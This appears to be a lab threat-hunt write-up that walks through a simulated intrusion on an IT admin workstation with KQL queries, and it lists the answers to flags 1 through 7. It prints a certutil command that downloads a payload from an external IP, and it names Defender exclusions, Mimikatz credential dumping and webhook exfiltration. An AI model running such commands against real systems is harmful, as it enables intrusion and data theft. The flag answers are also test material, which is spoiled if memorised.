# Threat Hunt Report: Azuki Series: Pt 1: Port of Entry

**Date of Report:** 2026-03-30

**Analyst:** Madelynn Charron

---

## Executive Summary
Azuki Import/Export experienced a targeted compromise resulting in the theft of sensitive supplier contracts and pricing data. The attacker gained initial access through a successful Remote Desktop Protocol (RDP) login using compromised credentials associated with the *kenji.sato* account.

Following initial access, the attacker established persistence, disabled security controls, and staged malware within a hidden directory. Credential dumping tools were used to escalate access, enabling lateral movement to additional systems. Sensitive data was collected, compressed, and exfiltrated via a Discord webhook. The attacker maintained command-and-control communication and attempted to evade detection by clearing event logs and creating a backdoor administrative account.

---

## Background

### **Situation**

Azuki Import/Export Trading Co. recently lost a six-year shipping contract after a competitor underbid them by exactly 3%. Shortly after, sensitive supplier contracts and pricing data were discovered on underground forums.

The precision of the underbid, combined with the data leak, strongly suggests a targeted compromise resulting in **intellectual property theft and data exfiltration**.

### **Company Overview**

- **Name:** Azuki Import/Export Trading Co.
- **Size:** 23 employees
- **Industry:** Shipping & logistics
- **Region:** Japan / Southeast Asia

### **Compromised System**

- **Hostname:** `AZUKI-SL`
- **Role:** IT Administrator Workstation
- **Significance:** High-value target with elevated privileges and access to sensitive business data

---

## Investigation Overview

### **Available Evidence**

- Microsoft Defender for Endpoint (MDE) telemetry, including:
    - Process events
    - Network activity
    - File activity
    - Registry modifications

### Tools & Environment

- Microsoft Defender for Endpoint (MDE)
- Kusto Query Language (KQL)
- Windows OS telemetry

### **Investigation Objectives**

The threat hunt aims to answer the following key questions:

- What was the **initial access vector**?
- Which **user account(s)** were compromised?
- What **data was accessed or stolen**?
- How was data **exfiltrated**?
- Did the attacker establish **persistence** within the environment?
- Is there evidence of **lateral movement** to other systems?

### **Hunt Scope & Initial Query**

The investigation focuses on activity originating from the compromised administrative workstation within the identified timeframe.
This query establishes a baseline of process activity to identify suspicious behavior, attacker tooling, and execution patterns throughout the intrusion lifecycle.

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
```

---

## Attack Path Summary

- Initial access gained via exposed RDP using compromised credentials (*kenji.sato*)
- PowerShell used to download malicious script (`wupdate.ps1`)
- Defender protections disabled via registry modifications
- Malware staged in hidden directory (`C:\ProgramData\WindowsCache`)
- Payload downloaded using `certutil.exe`
- Persistence established via scheduled task and backdoor account
- Credentials dumped using renamed Mimikatz (`mm.exe`)
- Data collected and archived (`export-data.zip`)
- Data exfiltrated via Discord webhook
- Logs cleared to evade detection

---

## Investigation Timeline

| Time (UTC) | Event | Details |
| --- | --- | --- |
| 2025-11-19 00:57:18 | Initial Access (RDP) | Successful Remote Desktop login from external IP **88.97.178.12** using compromised account *kenji.sato* |
| 2025-11-19 18:49:27 | Defense Evasion | Windows Defender exclusions added for file extensions (.ps1, .exe, .bat) and Temp directory |
| 2025-11-19 18:49:48 | Execution | PowerShell used with `ExecutionPolicy Bypass` to download `wupdate.ps1` from attacker server |
| 2025-11-19 19:04:01 | Discovery | `arp.exe -a` executed to enumerate internal network devices |
| 2025-11-19 19:05:33 | Defense Evasion | Hidden staging directory `C:\ProgramData\WindowsCache` created using `attrib` |
| 2025-11-19 19:06:58 | Payload Delivery | `certutil.exe` used to download malicious `svchost.exe` from **78.141.196.6** |
| 2025-11-19 19:07:47 | Persistence | Scheduled task **"Windows Update Check"** created to execute malware daily as SYSTEM |
| 2025-11-19 19:08:26 | Credential Access | Renamed Mimikatz (`mm.exe`) executed with `sekurlsa::logonpasswords` |
| 2025-11-19 19:08:58 | Collection | Sensitive data compressed into `export-data.zip` in staging directory |
| 2025-11-19 19:09:21 | Exfiltration | Data exfiltrated via `curl.exe` to Discord webhook |
| 2025-11-19 19:09:48 | Persistence (Alt Access) | New admin account **support** created and added to Administrators group |
| 2025-11-19 19:10:42 | Lateral Movement | RDP connection initiated to internal host **10.1.0.188** using `mstsc.exe` |
| 2025-11-19 19:11:04 | Command & Control | Compromised host communicates with C2 server **78.141.196.6** over port 443 |
| 2025-11-19 19:11:39 | Anti-Forensics | Windows event logs cleared using `wevtutil`, starting with Security log |

---

## Flags (1-20)

## 🚩 Flag 1: INITIAL ACCESS - Remote Access Source

**Objective:** Remote Desktop Protocol connections leave network traces that identify the source of unauthorized access. Determining the origin helps with threat actor attribution and blocking ongoing attacks.

**Question:** Identify the source IP address of the Remote Desktop Protocol connection?

**Flag Value:** `88.97.178.12`

**Date / Time Detected:** 2025-11-19T00:57:18.3409813Z (12:57:18 AM)

**Query Used:**

```kql
DeviceLogonEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki"
| where LogonType == "RemoteInteractive"
| where ActionType == "LogonSuccess"
| where RemoteIP != ""
| where RemoteIPType == "Public"
| project Timestamp, DeviceName, ActionType, RemoteIP, RemoteIPType, LogonType
| sort by Timestamp asc
```

**Evidence:**

<img width="1154" height="189" alt="image" src="https://github.com/user-attachments/assets/53cd2725-61cd-4ff5-8ab3-1e578f9427f2" />

**Key Observations:**

- Successful **RemoteInteractive (RDP)** logon observed
- Source IP: **`88.97.178.12`** (public IP)
- Authentication succeeded on multiple Azuki devices using kenji.sato account
- Activity occurred outside normal business context (early hours)
- External IP indicates access originated from outside corporate network

**Analysis:**

The Remote Desktop logon from a public IP address indicates that the attacker gained initial access via exposed or accessible RDP services. The use of valid credentials suggests either credential theft or brute force authentication. Since the connection originated externally and successfully authenticated, this confirms a compromised account was leveraged for initial access.

**MITRE ATT&CK Mapping:**
| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0001 | Initial Access |
| Technique | T1078 | Valid Accounts |


## 🚩 Flag 2: INITIAL ACCESS - Compromised User Account

**Objective:** Identifying which credentials were compromised determines the scope of unauthorized access and guides remediation efforts including password resets and privilege reviews.

**Question:** Identify the user account that was compromised for initial access?

**Flag Value:** `kenji.sato`

**Date / Time Detected:** 2025-11-19T00:57:18.3409813Z (12:57:18 AM)

**Key Observations:**

- Account `kenji.sato` used during the suspicious RDP session
- Same timestamp as initial access event
- Account successfully authenticated from external IP
- Indicates legitimate credentials were used

**Analysis:**

The attacker leveraged the `kenji.sato` account to gain access via RDP. This account becomes the initial foothold for all subsequent attacker activity.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0001 | Initial Access |
| Technique | T1078 | Valid Accounts |


## 🚩 Flag 3: DISCOVERY - Network Reconnaissance

**Objective:** Attackers enumerate network topology to identify lateral movement opportunities and high-value targets. This reconnaissance activity is a key indicator of advanced persistent threats.

**Question:** Identify the command and argument used to enumerate network neighbor's?

**Flag Value:** `"ARP.EXE" -a`

**Date / Time Detected:** 2025-11-19T19:04:01.773778Z (7:04:01 PM)

**Query Used:**

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki-sl" 
| where ProcessCommandLine contains "arp"
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessRemoteSessionIP
| sort by TimeGenerated desc
```

**Evidence:**

<img width="2107" height="63" alt="image" src="https://github.com/user-attachments/assets/2db79faa-5bf6-4815-8828-f6075bf0be24" />

**Key Observations:**

- Attacker used:`arp.exe -a`
- Command run from compromised host
- Enumerates local network neighbors (ARP table)
- Indicates attacker is mapping internal network

**Analysis:**
The use of `arp.exe -a` shows the attacker began **internal reconnaissance** after gaining access. This command allows the attacker to identify other devices on the network, which is a critical step for **lateral movement planning**.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0007 | Discovery |
| Technique | T1046 | Network Service Discovery |
| Technique | T1016 | System Network Configuration Discovery |

---

## 🚩Flag 4: DEFENCE EVASION - Malware Staging Directory

**Objective:** Attackers establish staging locations to organize tools and stolen data. Identifying these directories reveals the scope of compromise and helps locate additional malicious artefacts.

**Question:** Identify the PRIMARY staging directory where malware was stored?

**Flag Value:** `C:\ProgramData\WindowsCache`

**Date / Time Detected:** 2025-11-19T19:05:33.7665036Z (7:05:33 PM)

**Query Used:**

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki-sl"
| where ProcessCommandLine has_any ("mkdir", "New-Item", "attrib")
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine
| sort by TimeGenerated desc
```

**Evidence:** 

<img width="1889" height="67" alt="image" src="https://github.com/user-attachments/assets/1321bd67-6ad7-4bf8-811c-92a5a2c38ebe" />

**Key Observations:**

- Directory created: `C:\ProgramData\WindowsCache`
- Use of LOLBIN: `attrib` to hide files/folder
- Directory used repeatedly for:
    - Malware storage
    - Tool execution
    - Data staging
- Located in a commonly trusted system path

**Analysis:**

The attacker created a hidden staging directory to store and execute malicious payloads. By using `attrib` to mark files as hidden, this reduced visibility to both user and detection tools.
 Placing this directory under `ProgramData` helps blend malicious activity with legitimate system files, indicating deliberate defense evasion and operational planning.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0005 | Defense Evasion |
| Technique | T1564.001 | Hidden Files and Directories |

## 🚩 Flag 5: DEFENCE EVASION - File Extension Exclusions

**Objective:** Attackers add file extension exclusions to Windows Defender to prevent scanning of malicious files. Counting these exclusions reveals the scope of the attacker's defense evasion strategy.

**Question:** How many file extensions were excluded from Windows Defender scanning?

**Flag Value:** 3

**Date / Time Detected:** 2025-11-19T18:49:27.7301011Z (6:49:27 PM)

**Query Used:**

```kql
DeviceRegistryEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki-sl"
| where RegistryKey contains "Exclusions\\Extensions"
| project TimeGenerated, ActionType, DeviceName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, RegistryKey, RegistryValueName
| sort by TimeGenerated desc
```

**Evidence:** 

<img width="1759" height="129" alt="image" src="https://github.com/user-attachments/assets/770214d1-1a92-4daf-9bdb-ef064ff719ad" />

**Key Observations:**

- Registry modifications to:
    - `Windows Defender\Exclusions\Extensions`
- Excluded file types:
    - `.ps1`, `.exe`, `.bat`
    - Ignores listed extensions to allow malware with those file types can run freely.

**Analysis:**
The attacker excluded commonly abused file types from Windows Defender scanning. This ensures that malicious scripts, executables, and batch files can execute without detection or interruption.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0005 | Defense Evasion |
| Technique | T1562.001 | Impair Defenses: Disable or Modify Tools |

## 🚩 Flag 6: DEFENCE EVASION - Temporary Folder Exclusion

**Objective:** Attackers add folder path exclusions to Windows Defender to prevent scanning of directories used for downloading and executing malicious tools. These exclusions allow malware to run undetected.

**Question:** What temporary folder path was excluded from Windows Defender scanning?

**Flag Value:** `C:\Users\KENJI~1.SAT\AppData\Local\Temp`

**Date / Time Detected:** 2025-11-19T18:49:27.6830204Z (6:49:27 PM)

**Query Used:**

```kql
DeviceRegistryEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki-sl"
| where RegistryKey contains "Exclusions\\Paths"
| project TimeGenerated, ActionType, DeviceName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, RegistryKey, RegistryValueName
| sort by TimeGenerated desc
```

**Evidence:** 

<img width="1906" height="98" alt="image" src="https://github.com/user-attachments/assets/fdbe5601-5e62-45ef-838c-d9c2a9a4b9a5" />

**Key Observations:**

- Registry path modified:
    - `Windows Defender\Exclusions\Paths`
- Excluded directory:
    - `C:\Users\KENJI~1.SAT\AppData\Local\Temp`
- Temp directory is commonly used for:
    - Payload downloads
    - Script execution

**Analysis:**

By excluding the Temp directory from Defender scanning, the attacker ensured that downloaded payloads (such as scripts and executables) could be executed without detection.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0005 | Defense Evasion |
| Technique | T1562.001 | Impair Defenses: Disable or Modify Tools |

## 🚩 Flag 7: DEFENCE EVASION - Download Utility Abuse

**Objective:** Legitimate system utilities are often weaponized to download malware while evading detection. Identifying these techniques helps improve defensive controls.

**Question:** Identify the Windows-native binary the attacker abused to download files?

**Flag Value:** `certutil.exe`

**Date / Time Detected:** 2025-11-19T19:06:58.5778439Z (7:06:58 PM)

**Query Used:**

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where DeviceName contains "azuki-sl"
| where AccountName != "system"
| where ProcessCommandLine has_any ("certuil", "http", "url", "wget", "curl", "C:\\ProgramData\\WindowsCache")
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine
| sort by TimeGenerated desc
```

**Evidence:**

<img width="2196" height="266" alt="image" src="https://github.com/user-attachments/assets/6dbcac1a-39c0-47bf-8a38-62cb0193554d" />


**Key Observations:**

- Execution of **`certutil.exe`** with URL download parameters
- Command observed:
    - `certutil.exe -urlcache -f http://78.141.196.6:8080/svchost.exe`
- Payload saved to:
    - `C:\ProgramData\WindowsCache\svchost.exe`
- Activity observed across multiple hosts
- Use of a **legitimate Windows binary (LOLBIN)**

**Analysis:**

The attacker abused `certutil.exe`, a trusted Windows utility, to download a malicious payload from an external server. This technique allows the attacker to bypass traditional security controls by leveraging a legitimate, signed binary.

The downloaded file (`svchost.exe`) is likely disguised to appear legitimate, further aiding in evasion. This demonstrates a **living-off-the-land (LOLBins)** technique commonly used to avoid detection.

**MITRE ATT&CK Mapping:**

| **Field** | ID | Name |
| --- | --- | --- |
| Tactic | TA0005 | Defense Evasion |
| Technique | T1218 | Signed Binary Proxy Execution |
